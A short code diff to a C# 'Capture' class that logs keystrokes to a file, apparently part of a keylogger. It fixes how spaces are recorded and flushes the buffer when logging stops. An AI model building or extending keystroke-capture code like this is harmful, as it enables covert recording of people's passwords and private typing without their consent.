@@ -71,10 +71,11 @@ internal class Capture
                         var keyString = ((Keys)i).ToString();
 
                         // If the key is a letter or space, add it to the buffer
-                        if (keyString.Length == 1 && (char.IsLetterOrDigit(keyString[0]) || keyString[0] == ' '))
+                        if (keyString.Length == 1 && (char.IsLetterOrDigit(keyString[0])))
                             buffer += keyString;
                         // If the key is the Enter key, add a newline character to the buffer
                         else if (i == (int)Keys.Enter) buffer += "\n";
+                        else if (i == (int)Keys.Space) buffer += " ";
                     }
 
                     // Mark the key as pressed
@@ -92,6 +93,7 @@ internal class Capture
     // Method to stop the logging thread and close the file
     public void StopLogging()
     {
+        sw.Write(buffer);
         isLogging = false;
         loggingThread.Join();
         sw.Close();
